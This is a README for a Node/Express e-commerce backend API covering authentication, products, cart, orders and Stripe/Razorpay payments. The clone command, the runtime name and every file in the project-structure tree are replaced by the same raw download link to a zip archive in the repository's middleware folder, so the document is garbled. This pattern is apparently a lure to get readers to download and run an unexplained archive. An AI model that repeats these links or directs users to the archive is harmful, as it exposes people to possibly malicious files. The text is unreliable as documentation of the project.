# E-Commerce Backend API

A robust and scalable https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip backend API for e-commerce applications with complete user authentication, product management, shopping cart, and order processing capabilities.

## 🚀 Features

- **User Management**: Registration, authentication, and profile management
- **Product Catalog**: Complete CRUD operations for product management
- **Shopping Cart**: Add, update, and remove items from cart
- **Order Processing**: Order creation, tracking, and management
- **Payment Integration**: Stripe and Razorpay payment gateway support
- **Authentication & Authorization**: JWT-based auth with role-based access control (Admin/User)
- **Cloud Storage**: Cloudinary integration for image uploads
- **Database**: MongoDB with Mongoose ODM

## 📋 Prerequisites

Before running this project, ensure you have:

- https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip (v14 or higher)
- MongoDB (local or Atlas connection)
- npm or yarn package manager

## 🛠️ Installation

1. **Clone the repository**
```bash
git clone https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip
cd complete-ecommerce-backend
```

2. **Install dependencies**
```bash
npm install
```

3. **Environment Configuration**

Create a `.env` file in the root directory with the following variables:

```env
# Server Configuration
PORT=5000

# Database
MONGODB_URI=your_mongodb_connection_string

# Admin Details
ADMIN_EMAIL=your_admin_email
ADMIN_PASSWORD=your_admin_password

# JWT Secret
JWT_SECRET=your_jwt_secret_key

# Cloudinary Configuration
CLOUDINARY_CLOUD_NAME=your_cloud_name
CLOUDINARY_API_KEY=your_api_key
CLOUDINARY_API_SECRET=your_api_secret

# Payment Gateways
STRIPE_SECRET_KEY=your_stripe_secret_key
STRIPE_PUBLISHABLE_KEY=your_stripe_publishable_key

RAZORPAY_KEY_ID=your_razorpay_key_id
RAZORPAY_KEY_SECRET=your_razorpay_key_secret

# CORS
FRONTEND_URL=http://localhost:3000
```

## 🚦 Running the Application

**Development Mode** (with auto-reload):
```bash
npm run server
```

**Production Mode**:
```bash
npm start
```

The server will start on `http://localhost:5000` (or your specified PORT)

## 📁 Project Structure

```
backend/
├── config/
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip      # Cloudinary configuration
│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip          # MongoDB connection setup
├── controllers/
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip   # Shopping cart logic
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip  # Order management
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip # Product CRUD operations
│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip   # User authentication & management
├── middleware/
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # Admin authorization middleware
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip             # JWT authentication middleware
│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip           # File upload handling
├── models/
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip       # Order schema
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip     # Product schema
│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # User schema
├── routes/
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # Cart endpoints
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip       # Order endpoints
│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip     # Product endpoints
│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # User endpoints
├── .env                    # Environment variables
├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip            # Dependencies and scripts
└── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip               # Application entry point
```

## 🔌 API Endpoints

### Authentication
- `POST /api/user/register` - Register new user
- `POST /api/user/login` - User login
- `POST /api/user/admin` - Admin login

### Products
- `GET /api/products` - Get all products
- `GET /api/products/:id` - Get single product
- `POST /api/products` - Create product (Admin)
- `PUT /api/products/:id` - Update product (Admin)
- `DELETE /api/products/:id` - Delete product (Admin)

### Cart
- `GET /api/cart` - Get user cart
- `POST /api/cart` - Add item to cart
- `PUT /api/cart/:id` - Update cart item
- `DELETE /api/cart/:id` - Remove cart item

### Orders
- `GET /api/orders` - Get user orders
- `GET /api/orders/:id` - Get single order
- `POST /api/orders` - Create new order
- `PUT /api/orders/:id` - Update order status (Admin)

## 🔐 Authentication

This API uses JWT (JSON Web Tokens) for authentication. Include the token in the Authorization header:

```
Authorization: Bearer <your_jwt_token>
```

## 👥 User Roles

- **User**: Can browse products, manage cart, place orders
- **Admin**: Full access including product management, order management

## 📦 Dependencies

- **express** - Web framework
- **mongoose** - MongoDB ODM
- **bcrypt** - Password hashing
- **jsonwebtoken** - JWT authentication
- **cloudinary** - Image upload and management
- **multer** - File upload handling
- **cors** - Cross-origin resource sharing
- **dotenv** - Environment variable management
- **validator** - Data validation
- **stripe** - Stripe payment integration
- **razorpay** - Razorpay payment integration
- **react-paystack** - Paystack integration (if needed)

## 🔧 Development

- Use `npm run server` for development with nodemon auto-reload
- Follow RESTful API conventions
- Implement proper error handling
- Validate all user inputs
- Use environment variables for sensitive data



## 📝 License

MIT

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📧 Contact

For issues and questions, please open an issue in the repository.

---

**Built with ❤️ using https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip and Express**